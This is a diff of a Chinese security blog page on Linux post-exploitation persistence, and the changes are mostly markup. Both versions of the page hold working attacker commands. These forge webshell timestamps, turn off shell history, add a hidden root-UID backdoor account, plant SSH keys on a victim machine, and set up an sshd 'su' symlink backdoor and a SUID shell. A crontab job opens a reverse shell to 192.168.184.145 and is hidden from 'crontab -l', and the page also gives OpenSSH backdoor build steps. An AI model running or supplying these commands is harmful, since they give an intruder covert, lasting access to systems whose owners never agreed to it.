@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言正文隐藏文件同Windows一样,Linux 也有隐藏文件的形式.其特点是文件以.开头,比如创建一个隐藏文件. 1touch .index.php  显示隐藏文件,使用ls -a选项就可以了. 隐藏文件属性我们知道在Linux系统下,文件是拥有修改时间等记录的,如果我们直接创建一个后门文件,管理员很容易通过文件属性判断文件是否被修改.所以我们需要对文件的属性进行部分修改 123# 使用 tou">
+    <meta name="description" content="前言正文隐藏文件同Windows一样,Linux 也有隐藏文件的形式.其特点是文件以.开头,比如创建一个隐藏文件. touch .index.php  显示隐藏文件,使用ls -a选项就可以了. 隐藏文件属性我们知道在Linux系统下,文件是拥有修改时间等记录的,如果我们直接创建一个后门文件,管理员很容易通过文件属性判断文件是否被修改.所以我们需要对文件的属性进行部分修改 # 使用 touch 命">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux 权限维持常见方法">
 <meta property="og:url" content="http://n0el4kls.github.io/2022/07/26/2022-07-26-Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="前言正文隐藏文件同Windows一样,Linux 也有隐藏文件的形式.其特点是文件以.开头,比如创建一个隐藏文件. 1touch .index.php  显示隐藏文件,使用ls -a选项就可以了. 隐藏文件属性我们知道在Linux系统下,文件是拥有修改时间等记录的,如果我们直接创建一个后门文件,管理员很容易通过文件属性判断文件是否被修改.所以我们需要对文件的属性进行部分修改 123# 使用 tou">
+<meta property="og:description" content="前言正文隐藏文件同Windows一样,Linux 也有隐藏文件的形式.其特点是文件以.开头,比如创建一个隐藏文件. touch .index.php  显示隐藏文件,使用ls -a选项就可以了. 隐藏文件属性我们知道在Linux系统下,文件是拥有修改时间等记录的,如果我们直接创建一个后门文件,管理员很容易通过文件属性判断文件是否被修改.所以我们需要对文件的属性进行部分修改 # 使用 touch 命">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220731174428686.png">
 <meta property="og:image" content="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220731174558594.png">
@@ -55,6 +55,16 @@
     
 	<!-- mathjax -->
 	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
 <meta name="generator" content="Hexo 6.1.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -69,13 +79,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </span>
@@ -164,30 +174,59 @@
 
   <div class="content" itemprop="articleBody">
     <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><p>同<code>Windows</code>一样,<code>Linux</code> 也有隐藏文件的形式.其特点是文件以<code>.</code>开头,比如创建一个隐藏文件.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch .index.php</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell">touch .index.php</code></pre>
 
 <p>显示隐藏文件,使用<code>ls -a</code>选项就可以了.</p>
 <h2 id="隐藏文件属性"><a href="#隐藏文件属性" class="headerlink" title="隐藏文件属性"></a>隐藏文件属性</h2><p>我们知道在<code>Linux</code>系统下,文件是拥有修改时间等记录的,如果我们直接创建一个后门文件,管理员很容易通过文件属性判断文件是否被修改.所以我们需要对文件的属性进行部分修改</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 <span class="built_in">touch</span> 命令</span></span><br><span class="line">touch webshell.php -r index.php</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定webshell 的文件时间属性和 index.php 的文件时间属性相同</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 <span class="hljs-built_in">touch</span> 命令</span>
+touch webshell.php -r index.php
+<span class="hljs-meta prompt_"># </span><span class="language-bash">指定webshell 的文件时间属性和 index.php 的文件时间属性相同</span></code></pre>
 
 
 
-<h2 id="禁止修改权限"><a href="#禁止修改权限" class="headerlink" title="禁止修改权限"></a>禁止修改权限</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不得任意更动文件或目录。</span></span><br><span class="line">chattr +i /etc/passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件属性</span></span><br><span class="line">lsattr /etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="禁止修改权限"><a href="#禁止修改权限" class="headerlink" title="禁止修改权限"></a>禁止修改权限</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">不得任意更动文件或目录。</span>
+chattr +i /etc/passwd
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">查看文件属性</span>
+lsattr /etc/passwd</code></pre>
 
 
 
 <h2 id="History-隐藏"><a href="#History-隐藏" class="headerlink" title="History 隐藏"></a>History 隐藏</h2><p>当我们登录系统后,执行的所有命令都会被系统记载,我们可以使用以下命令关闭历史命令的记录.</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用历史命令</span></span><br><span class="line">[space] set +o history</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启历史命令</span></span><br><span class="line">[space] set -o history</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">禁用历史命令</span>
+[space] set +o history
+<span class="hljs-meta prompt_"># </span><span class="language-bash">[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span>
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">开启历史命令</span>
+[space] set -o history</code></pre>
 
 
 
-<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个用户名guest，密码123456的普通用户</span></span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">useradd -p 方法  ` ` 是用来存放可执行的系统命令,<span class="string">&quot;<span class="subst">$()</span>&quot;</span>也可以存放命令执行语句</span></span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">chpasswd方法</span></span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> -e方法</span></span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建一个用户名guest，密码123456的普通用户</span>
+useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">useradd -p 方法  ` ` 是用来存放可执行的系统命令,<span class="hljs-string">&quot;<span class="hljs-subst">$()</span>&quot;</span>也可以存放命令执行语句</span>
+useradd -p &quot;$(openssl passwd -1 123456)&quot; guest
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">chpasswd方法</span>
+useradd guest;echo &#x27;guest:123456&#x27;|chpasswd
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> -e方法</span>
+useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</code></pre>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加root用户</span></span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加root用户</span>
+useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</code></pre>
 
 
 
-<h2 id="SSH-免密登录"><a href="#SSH-免密登录" class="headerlink" title="SSH 免密登录"></a>SSH 免密登录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成密钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将生成的 id_rsa.pub 追加到 受害机器的 .ssh/authorized_keys</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里我先将 沈城的id_rsa.pub 上传到目标机器,然后 使用 <span class="built_in">cat</span> id_rda.pub &gt;&gt; authorized_keys 将其追加到 ~/.ssh/authorized_keys 文件.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后就可以直接使用 ssh 命令登陆了</span></span><br><span class="line">ssh username@ipaddress</span><br></pre></td></tr></table></figure>
+<h2 id="SSH-免密登录"><a href="#SSH-免密登录" class="headerlink" title="SSH 免密登录"></a>SSH 免密登录</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">生成密钥</span>
+ssh-keygen -t rsa
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">将生成的 id_rsa.pub 追加到 受害机器的 .ssh/authorized_keys</span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">这里我先将 沈城的id_rsa.pub 上传到目标机器,然后 使用 <span class="hljs-built_in">cat</span> id_rda.pub &gt;&gt; authorized_keys 将其追加到 ~/.ssh/authorized_keys 文件.</span>
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">之后就可以直接使用 ssh 命令登陆了</span>
+ssh username@ipaddress</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220731174428686.png" alt="image-20220731174428686"></p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220731174558594.png" alt="image-20220731174558594"></p>
@@ -209,17 +248,21 @@
 <p>实验:</p>
 <p>在使用之前,需要检查 <code>UsePAM</code> 是否启用,默认启用. </p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220731182718820.png" alt="image-20220731182718820"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=11111</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">你可以将 12345 换成任意指定的端口号</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
+ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=11111
+<span class="hljs-meta prompt_"># </span><span class="language-bash">你可以将 12345 换成任意指定的端口号</span></code></pre>
 
 <blockquote>
 <p>只测试成功了root用户下执行后门命令，然后通过其他普通用户任用密码登录</p>
 </blockquote>
 <h2 id="suid-后门"><a href="#suid-后门" class="headerlink" title="suid 后门"></a>suid 后门</h2><p>我们都知道 suid 用户提权,</p>
 <p>相反,为了避免动静太大,在我们获取到root账户后,创建一个普通用户,并设置一个<code>suid 的shell</code>,到时候直接利用普通用户登录也能拥有<code>root</code> 权限</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell">cp /bin/bash /tmp/shell
+chmod u+s /tmp/shell</code></pre>
 
 <p>使用：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">主要bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。</span></span><br><span class="line">./.shell -p</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">主要bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。</span>
+./.shell -p</code></pre>
 
 <blockquote>
 <p>注：</p>
@@ -231,13 +274,31 @@
 <h2 id="crontab-定时任务"><a href="#crontab-定时任务" class="headerlink" title="crontab 定时任务"></a>crontab 定时任务</h2><p>定时任务执个脚本:</p>
 <p>普通的定时任务会通过 <code>crontab -l</code> 查看.</p>
 <p><code>1.sh</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.184.145/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.184.145/5555 0&gt;&amp;1</code></pre>
 
 <p><code>2.sh</code>:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*/1 * * * * /root/1.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs shell">(crontab -l;printf &quot;*/1 * * * * /root/1.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre>
 
 <p>运行 <code>2.sh</code> 建立<code>crontab</code>隐藏后门.</p>
-<h2 id="openssh-后门"><a href="#openssh-后门" class="headerlink" title="openssh 后门"></a>openssh 后门</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu</span></span><br><span class="line">sudo apt-get install openssl</span><br><span class="line">sudo apt-get install libssl-dev</span><br><span class="line">sudo apt install zlib1g-dev</span><br><span class="line">sudo apt install gcc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 简化为一行</span></span></span><br><span class="line">sudo apt install openssl libssl-dev zlib1g-dev gcc -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RedHat、centos</span></span><br><span class="line">yum install -y openssl openssl-devel pam-devel</span><br><span class="line">yum install zlib-devel</span><br><span class="line">yum install gcc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 简化为一行</span></span></span><br><span class="line">yum install -y openssl openssl-devel pam-devel zlib-devel zlib-devel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装及编译</span></span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br></pre></td></tr></table></figure>
+<h2 id="openssh-后门"><a href="#openssh-后门" class="headerlink" title="openssh 后门"></a>openssh 后门</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Ubuntu</span>
+sudo apt-get install openssl
+sudo apt-get install libssl-dev
+sudo apt install zlib1g-dev
+sudo apt install gcc
+<span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 简化为一行</span></span>
+sudo apt install openssl libssl-dev zlib1g-dev gcc -y
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">RedHat、centos</span>
+yum install -y openssl openssl-devel pam-devel
+yum install zlib-devel
+yum install gcc
+<span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 简化为一行</span></span>
+yum install -y openssl openssl-devel pam-devel zlib-devel zlib-devel
+<span class="hljs-meta prompt_"></span>
+<span class="hljs-meta prompt_"># </span><span class="language-bash">安装及编译</span>
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</code></pre>
 
 <p>Ubuntu 复现失败….</p>
 <p>centos <a target="_blank" rel="noopener" href="http://hone.cool/2018/03/22/OpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85/">http://hone.cool/2018/03/22/OpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85/</a></p>
@@ -268,13 +329,13 @@
          
           <li><a href="/">Home</a></li>
          
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
          
-          <li><a href="/categories/">categories</a></li>
+          <li><a href="/categories">Categories</a></li>
          
-          <li><a href="/tags/">tags</a></li>
+          <li><a href="/tags">Tags</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li>
         
       </ul>
     </div>
@@ -325,13 +386,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </nav>
